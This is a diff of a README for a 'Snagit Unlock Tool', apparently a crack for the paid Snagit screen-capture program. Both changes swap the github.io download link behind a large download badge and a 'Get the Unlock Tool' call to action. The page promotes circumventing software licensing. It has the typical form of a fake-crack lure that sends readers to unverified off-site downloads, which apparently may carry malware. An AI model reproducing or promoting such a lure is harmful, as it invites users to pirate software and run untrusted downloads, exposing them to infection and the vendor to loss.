@@ -6,7 +6,7 @@
 <h1 align="center">📸 Snagit Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/122" target="_blank">
+  <a href="https://snagitdw.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Snagit%20Unlock%20Tool-Unlock%20Full%20Capture%20Power-FF6F00?style=for-the-badge&logo=icloud&logoColor=white" 
          alt="Download Snagit Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -100,7 +100,7 @@ Open an issue or create a pull request — contributions are welcome.
 ## ⭐ Unlock Snagit – Capture Without Limits
 
 Maximize your capture potential.  
-[Get the Unlock Tool](https://hiopal3847.github.io/.github/122) and unleash the complete Snagit experience.
+[Get the Unlock Tool](https://snagitdw.github.io/.github/) and unleash the complete Snagit experience.
 
 ---
 
